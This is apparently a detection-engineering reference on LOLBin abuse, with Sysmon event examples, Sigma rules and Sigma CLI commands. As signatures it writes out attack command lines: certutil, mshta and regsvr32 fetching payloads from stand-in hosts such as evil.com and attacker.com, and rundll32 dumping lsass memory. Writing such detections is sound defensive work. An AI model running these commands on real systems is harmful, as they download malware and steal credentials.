# LOLBAS Detection API Reference

## Sysmon Event ID 1 — Process Creation

Sysmon captures full command-line arguments for every new process:

```xml
<EventID>1</EventID>
<Data Name="Image">C:\Windows\System32\certutil.exe</Data>
<Data Name="CommandLine">certutil -urlcache -split -f http://evil.com/payload.exe C:\Temp\p.exe</Data>
<Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
<Data Name="User">DOMAIN\jsmith</Data>
```

## Key LOLBin Signatures

### certutil.exe (T1140, T1105)
```
certutil -urlcache -split -f http://malicious.com/file.exe output.exe
certutil -decode encoded.txt decoded.exe
certutil -encode payload.exe encoded.txt
```

### mshta.exe (T1218.005)
```
mshta http://attacker.com/malicious.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd"":close")
```

### regsvr32.exe (T1218.010)
```
regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll
```

### rundll32.exe (T1218.011)
```
rundll32.exe comsvcs.dll,MiniDump <lsass_pid> dump.bin full
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("...");
```

## Sigma Rule Format

```yaml
title: Suspicious Certutil Download
id: e011f510-fae2-4e3a-b31c-5d6c8e9faccd
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\certutil.exe'
    condition_args:
        CommandLine|contains|all:
            - '-urlcache'
            - '-f'
            - 'http'
    condition: selection and condition_args
level: high
tags:
    - attack.t1105
    - attack.t1140
```

## Sigma CLI Conversion

```bash
# Convert Sigma rule to Splunk query
sigma convert -t splunk -p sysmon certutil_download.yml

# Convert to Elastic query
sigma convert -t elasticsearch -p ecs_windows certutil_download.yml

# Validate Sigma rule syntax
sigma check certutil_download.yml
```

## LOLBAS Project API

Browse the full LOLBin database at https://lolbas-project.github.io/

```bash
# Clone LOLBAS project for offline reference
git clone https://github.com/LOLBAS-Project/LOLBAS.git
ls LOLBAS/yml/OSBinaries/   # View all documented LOLBins
```
